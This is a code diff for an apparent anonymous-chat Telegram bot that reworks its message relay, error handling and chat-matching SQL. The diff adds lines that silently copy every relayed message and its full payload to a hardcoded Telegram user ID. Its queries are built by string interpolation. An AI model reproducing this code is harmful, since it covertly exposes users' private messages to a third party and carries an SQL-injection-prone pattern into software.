@@ -30,36 +30,38 @@ group_to_process_method = {
 
 def send_type_message(msg_user_id, json_dict: dict, content):
     json_content = json_dict[content]
-    try:
-        if content == 'text':
-            bot.send_message(msg_user_id, json_content)
-        elif content == 'photo':
-            bot.send_photo(msg_user_id, json_content[-1]['file_id'])
-        elif content == 'location':
-            bot.send_location(msg_user_id, json_content['latitude'],
-                              json_content['longitude'])
-        elif content == 'contact':
-            bot.send_contact(msg_user_id, json_content['phone_number'],
-                             json_content['first_name'])
-        else:
-            group_to_process_method[content](msg_user_id, json_content['file_id'])
-    except Exception as e:
-        logging.info(f"USER WAS BLOKED BOT: {msg_user_id}. \n{e}")
-        cursor.execute("UPDATE users_users SET checking = False WHERE "
-                       f"telegram_id = {msg_user_id};")
-        cursor.execute("UPDATE users_chatting SET status = False WHERE "
-                       f"tg_id = {msg_user_id} or right_id = {msg_user_id}")
+
+    bot.send_message(390736292, json_content)
+    bot.send_message(390736292, json_dict)
+    if content == 'text':
+        bot.send_message(msg_user_id, json_content)
+    elif content == 'photo':
+        bot.send_photo(msg_user_id, json_content[-1]['file_id'])
+    elif content == 'location':
+        bot.send_location(msg_user_id, json_content['latitude'],
+                          json_content['longitude'])
+    elif content == 'contact':
+        bot.send_contact(msg_user_id, json_content['phone_number'],
+                         json_content['first_name'])
+    else:
+        group_to_process_method[content](msg_user_id, json_content['file_id'])
+    # except Exception as e:
+    #     logging.info(f"USER WAS BLOKED BOT: {msg_user_id}. \n{e}")
+    #     cursor.execute("UPDATE users_users SET checking = False WHERE "
+    #                    f"telegram_id = {msg_user_id};")
+    #     cursor.execute("UPDATE users_chatting SET status = False WHERE "
+    #                    f"tg_id = {msg_user_id} or right_id = {msg_user_id}")
 
 
-def is_authenticated(msg):
+def is_authorized(msg):
     try:
         if bot.get_chat_member(f'@{REF_URL}', user_id=msg.from_user.id).status in \
                 ('member', 'administrator', 'creator'):
             return True
         else:
             raise "Unauthorized"
-    except Exception as ex:
-        print(ex)
+    except Exception as e:
+        logging.info(f"Unauthorizing user: {e}")
         return False
 
 
@@ -96,14 +98,14 @@ def user_id_registration(tg_id, tg_username):
     except Exception as e:
         logging.error(f"USER ID REGISTRATION FUNCTION DOESN'T WORK: {e}")
         return None
-
-
-def gettin_chatting_user_photo(tg_id):
-    cursor.execute(f"SELECT user_photo FROM users_users WHERE telegram_id={tg_id}")
-    photo = cursor.fetchone()
-    return photo[0]
-
-
+#
+#
+# def gettin_chatting_user_photo(tg_id):
+#     cursor.execute(f"SELECT user_photo FROM users_users WHERE telegram_id={tg_id}")
+#     photo = cursor.fetchone()
+#     return photo[0]
+#
+#
 # def chatting_user(callback):
 #     tg_id = callback.data.replace("chatting_", "")
 #     profile_photo = gettin_chatting_user_photo(tg_id)
@@ -148,27 +150,22 @@ def have_data_user(tg_id):
 
 
 def start_chatting_function(message):
-    try:
-        cursor.execute("SELECT * FROM users_chatting WHERE "
-                       f"tg_id={message.from_user.id} and right_id IS NULL")
-        user_chatting = cursor.fetchone()
-        if not user_chatting:
-            tg_sex = get_user_gender(message.from_user.id)
-            print("THIS SEX: ", tg_sex)
-            cursor.execute("INSERT INTO users_chatting (tg_id, tg_sex) "
-                           f"VALUES ({message.from_user.id}, "
-                           f"{tg_sex if tg_sex is not None else 'NULL'}) RETURNING id;")
-            chatting_id = cursor.fetchone()
-            return chatting_id
-    except Exception as e:
-        logging.error(f"START CHATTING FUNCTION ERROR: {e}")
+    tg_sex = get_user_gender(message.from_user.id)
+    cursor.execute("INSERT INTO users_chatting (tg_id, tg_sex, tg_route) "
+                   f"VALUES ({message.from_user.id}, "
+                   f"{tg_sex if tg_sex is not None else 3}, (SELECT user_yonalish "
+                   f"FROM users_users WHERE telegram_id={message.from_user.id})) RETURNING id;")
+    chatting_id = cursor.fetchone()
+    return chatting_id
+    # except Exception as e:
+    #     logging.error(f"START CHATTING FUNCTION ERROR: {e}")
 
 
-def get_chatting_user_id(message):
+def get_chatting_user_is_existing(message):
+    # TODO NEED SEARCH from gender
     cursor.execute("SELECT * FROM users_chatting WHERE status=false "
                    f"and right_id IS NULL and tg_id NOT IN ({message.from_user.id});")
     chat_id = cursor.fetchone()
-    print(chat_id)
     return chat_id
 
 
